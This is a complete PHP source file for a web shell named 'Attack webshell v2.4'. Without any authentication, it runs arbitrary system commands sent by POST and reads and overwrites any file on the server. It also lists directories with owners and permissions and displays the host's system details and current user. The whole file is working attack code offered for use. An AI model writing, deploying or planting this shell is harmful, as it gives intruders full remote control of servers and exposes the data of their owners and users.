<?php
define('SCRIPT_NAME', 'Attack webshell v2.4');

$current_directory = getcwd();
$current_device = shell_exec('uname -a');
$current_user = shell_exec('whoami');
$command_output = '';
$file_content = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['change_dir'])) {
        $target_dir = $_POST['change_dir'];
        if (is_dir($target_dir)) {
            chdir($target_dir);
            $current_directory = getcwd();
        } else {
            chdir(dirname($target_dir));
            $current_directory = getcwd();
            $file_content = file_get_contents($target_dir);
        }
    }

    if (!empty($_POST['update_file']) && isset($_POST['file_content'])) {
        file_put_contents($_POST['update_file'], $_POST['file_content']);
    }

    if (!empty($_POST['command'])) {
        $command_output = shell_exec("cd \"{$current_directory}\" && {$_POST['command']} 2>&1");
    }
}

function getDirectoryContents($dir) {
    $result = [];
    if (!is_dir($dir)) {
        return $result;
    }

    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item !== '.') {
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            $stat = stat($path);
            $result[$item] = [
                'type' => is_dir($path) ? 'directory' : 'file',
                'permissions' => substr(sprintf('%o', fileperms($path)), -4),
                'owner' => posix_getpwuid($stat['uid'])['name'],
                'size' => $stat['size'],
                'modified' => date("F d Y H:i:s", $stat['mtime']),
            ];
        }
    }
    return $result;
}

$directory_contents = getDirectoryContents($current_directory);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars(SCRIPT_NAME); ?></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
        }
        .directory-path form { display: inline; }
        .directory-path input[type="submit"] {
            background: none;
            border: none;
            color: #bb86fc;
            cursor: pointer;
            text-decoration: underline;
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border: 1px solid #333; }
        th { background-color: #333; }
        tr:nth-child(even) { background-color: #1e1e1e; }
        tr:hover { background-color: #333; }
        textarea { width: 100%; height: 150px; background-color: #333; color: #e0e0e0; border: 1px solid #555; }
        input, button {
            background-color: #333;
            color: #e0e0e0;
            border: 1px solid #555;
            padding: 5px;
        }
        button { cursor: pointer; }
        h1, h3 { color: #bb86fc; }
    </style>
</head>
<body>
    <h1><?php echo htmlspecialchars(SCRIPT_NAME); ?></h1>
    <div>
        <strong>Device:</strong> <?php echo nl2br(htmlspecialchars($current_device)); ?><br>
        <strong>User:</strong> <?php echo htmlspecialchars($current_user); ?><br>
        <strong>Current Directory:</strong> <code><?php echo $current_directory; ?></code>
    </div>

    <br>
    
    <form method="post">
        <input type="text" name="command" placeholder="Enter command" autofocus autocomplete="off">
        <input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory); ?>">
        <button type="submit">Execute</button>
    </form>
    <pre><?php echo htmlspecialchars($command_output); ?></pre>

    <?php if (!empty($file_content)): ?>
        <h3>Editing: <?php echo htmlspecialchars($_POST['change_dir']); ?></h3>
        <form method="post">
            <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea><br>
            <input type="hidden" name="update_file" value="<?php echo htmlspecialchars($_POST['change_dir']); ?>">
            <button type="submit">Save Changes</button>
        </form>
    <?php endif; ?>

    <h3>Directory Contents</h3>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Owner</th>
                <th>Permissions</th>
                <th>Last Modified</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($directory_contents as $name => $info): ?>
                <tr>
                    <td>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory . '/' . $name); ?>">
                            <input type="submit" value="<?php echo htmlspecialchars($name); ?>">
                        </form>
                    </td>
                    <td><?php echo htmlspecialchars($info['type']); ?></td>
                    <td><?php echo htmlspecialchars($info['size']); ?></td>
                    <td><?php echo htmlspecialchars($info['owner']); ?></td>
                    <td><?php echo htmlspecialchars($info['permissions']); ?></td>
                    <td><?php echo htmlspecialchars($info['modified']); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>
